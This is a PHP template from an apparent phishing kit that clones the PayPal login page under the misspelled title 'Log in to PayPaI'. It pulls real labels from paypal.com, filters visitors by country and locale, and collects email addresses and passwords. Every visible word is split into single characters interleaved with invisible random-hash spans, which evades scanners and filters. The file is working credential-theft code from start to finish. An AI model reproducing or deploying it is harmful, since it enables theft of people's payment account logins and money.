<?php
require_once __DIR__ . '/function.php';

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if ($config_blocker == 1) {
  $api->cookie();
  $api->session();
}

if (isset($_GET['country_x']) && isset($_GET['locale_x'])) {
  if ($_GET['country_x'] != $_SESSION['code']) {
    $api->redirect("success");
  }
  else
  if ($_GET['locale_x'] != $_SESSION['lang'] . "_" . $_SESSION['code']) {
    $api->redirect("success");
  }
}
else {
  $api->redirect("success");
}

$api->visitor("Signin");

$html = $api->content("https://www.paypal.com/signin?country.x={$_SESSION['code']}&locale.x={$_SESSION['lang']}_{$_SESSION['code']}");
$title = $api->getStr($html, 'data-title="', '">');
$email = $api->getStr($html, '<label for="email" class="fieldLabel">', '</label>');
$password = $api->getStr($html, '<label for="password" class="fieldLabel">', '</label>');
$forgot = $api->getStr($html, 'startPwrFlowBtn">', '</a>');
$create = $api->getStr($html, 'createAccount">', '</a>');
$separator = $api->getStr($html, '<span class="textInSeparator" aria-label="', '">');
$login = $api->getStr($html, 'value="Login">', '</button>');
$required = $api->getStr($html, '<p class="emptyError hide">', '</p>');
$footer = $api->getStr($html, '</section>', '</div><div class="transitioning');
?>
<!DOCTYPE html>
<html>

<head>
<title>Log in to PayPaI</title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="assets/img/favicon.ico">
<link rel="apple-touch-icon" href="assets/img/apple-touch-icon.png">
<link rel="stylesheet" href="assets/css/signin_style.css">
<script src="assets/js/jquery.min.js" type="text/javascript"></script>
<script src="assets/js/jquery.validate.js" type="text/javascript"></script>
<script src="assets/js/signin.auth.js" type="text/javascript"></script>
</head>

<body>
<div class="main">
<section class="login">
<div class="corral">
<div class="contentContainer activeContent contentContainerBordered">
<header>
<p class="logo logo-long"></p>
</header>
<div class="notifications" tabindex="-1">
<p class="notification notification-critical hide" role="alert" id="notifications">

<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("S");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("m");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("f");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("y");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("u");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("r");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("f");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("s");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("'");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("r");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("r");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(".");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("P");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("l");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("s");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("r");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("y");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("g");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(".");?>
</p>
</div>
<form method="post" id="signin" autocomplete="off">
<div class="profileRememberedEmail hide" id="link">
<span class="profileDisplayPhoneCode"></span>
<span class="profileDisplayEmail" id="profileDisplayEmail"></span>
<a href="#" class="notYouLink" id="backToInputEmailLink"><?=$api->transcode("Not you?");?></a>
</div>

<div id="splitEmail" class="splitEmail">
<div id="splitEmailSection">
<div id="emailSection" class="clearfix">
<div class="textInput" id="login_emaildiv" style="z-index: 1;">
<div class="fieldWrapper">
<input type="text" placeholder="<?=$api->encode($email);?>" id="Email" name="email">
</div>
<div class="errorMessage" id="emailErrorMessage">
<p class="emptyError"><?=$api->encode($required);?></p>
</div>
</div>
</div>
<div class="actions">
<button class="button actionContinue login-login-click-next" type="submit" id="btnNext">
<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("N");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("x");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?></button>
</div>
</div>
</div>
<div id="splitPassword" class="splitPassword transformRightToLeft hide">
<div id="splitPasswordSection">
<div id="passwordSection" class="clearfix">
<div class="textInput" id="login_passworddiv">
<div class="fieldWrapper">
<div style="display:none; visibility:hidden;"><input type="text" name="killbill" maxlength="50"></div>
<input type="password" placeholder="<?=$api->encode($password);?>" id="Password" name="password">
<button type="button" class="showPassword hide show-hide-password login-show-password" id="showpassword">
<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("S");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("h");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("w");?></button>
<button type="button" class="hidePassword hide show-hide-password login-hide-password" id="hidepassword">
<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("H");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?></button>
</div>
<div class="errorMessage" id="passwordErrorMessage">
<p class="emptyError"><?=$api->encode($required);?></p>
</div>
</div>
</div>
</div>
<div class="actions">
<button class="button actionContinue login-login-submit" type="submit" id="btnLogin">
<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("L");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("g");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?></button>
</div>
</div>
</form>
<div class="forgotLink">
						<a href="#" class="scTrack:unifiedlogin-click-forgot-password">
<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("H");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("v");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("g");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("r");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("u");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("b");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("l");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("l");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("g");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("g");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("g");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("?");?></a>
					</div>
<div class="loginSignUpSeparator">
<span class="textInSeparator">or</span>
</div>
<a href="#" class="button secondary login-click-signup-button">
<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("S");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("g");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("U");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("p");?></a>
</div>
</div>

</section>
<div class="footer-wrapper"><?php include('footer.php') ?></div>
</div>
<div class="transitioning hide" id="loading"></div>

<script src="assets/js/signin.post.js"></script>
</body>

</html>
